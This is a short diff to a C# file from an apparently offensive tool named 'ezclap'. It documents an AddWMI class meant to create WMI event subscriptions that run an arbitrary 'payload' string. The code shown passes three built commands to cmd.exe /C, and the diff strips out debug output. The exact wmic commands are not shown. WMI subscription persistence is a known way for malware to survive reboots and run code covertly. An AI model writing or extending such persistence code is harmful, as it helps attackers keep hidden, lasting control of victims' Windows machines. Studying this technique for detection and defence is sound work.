@@ -5,6 +5,16 @@ using System.Collections.Generic;
 using Microsoft.Win32;
 using Microsoft.Win32.TaskScheduler;
 
+
+/*  Name: AddWMI 
+ *  Description: Creates a new WMI subscription/Event/Consumer using wmic. 
+ *  The default WMIC commands are added as a comment down below.
+ *  
+ *  Params:
+ *      - string[] name = Name of the WMI event to be added 
+ *      - string payload = Payload string to be executed
+ */
+
 namespace ezclap
 {
     public class AddWMI
@@ -32,11 +42,6 @@ namespace ezclap
             System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg1);
             System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg2);
             System.Diagnostics.Process.Start(@"C:\Windows\System32\cmd.exe", "/C " + arg3);
-
-            Console.WriteLine("\n[+] Hello from addWMI ! I should be called 2 times = " + name + " " +  payload + "\n");
-            Console.WriteLine(arg1+"\n");
-            Console.WriteLine(arg2 + "\n");
-            Console.WriteLine(arg3 + "\n");
         }
     }
 }
